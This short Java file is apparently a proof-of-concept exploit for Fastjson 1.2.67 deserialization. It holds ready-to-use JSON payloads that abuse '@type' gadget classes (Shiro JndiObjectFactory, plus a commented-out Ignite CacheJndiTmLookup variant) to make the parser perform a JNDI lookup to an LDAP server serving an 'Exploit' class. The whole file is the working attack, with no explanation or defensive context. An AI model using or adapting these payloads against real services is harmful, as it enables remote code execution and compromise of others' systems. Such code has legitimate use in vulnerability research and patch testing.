package com.firebasky.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class PoC_1_2_67 {
    public static void main(String[] args) {
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"tm\": {\"$ref\":\"$.tm\"}}";
        String poc = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:1389/Exploit\",\"instance\":{\"$ref\":\"$.instance\"}}";
        JSON.parse(poc);
    }
}